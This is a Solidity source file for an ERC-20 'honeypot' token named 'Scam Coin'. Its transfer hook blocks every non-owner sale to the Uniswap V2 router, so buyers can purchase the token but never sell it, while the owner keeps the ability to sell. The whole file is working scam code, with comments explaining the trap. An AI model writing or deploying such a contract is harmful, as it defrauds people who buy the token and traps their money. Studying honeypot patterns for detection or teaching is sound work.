// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract HoneypotToken is ERC20, Ownable {
    constructor() ERC20("Scam Coin", "SCAM") Ownable(msg.sender) {
        _mint(msg.sender, 1000000 * 10 ** decimals());
    }

    // This function intercepts transfers
    function _update(address from, address to, uint256 value) internal override {
        // IF we are selling (to Uniswap Router) AND not the owner
        // REVERT the transaction!
        if (to == 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D && from != owner()) {
            revert("Trapped! You cannot sell this token.");
        }
        super._update(from, to, value);
    }
}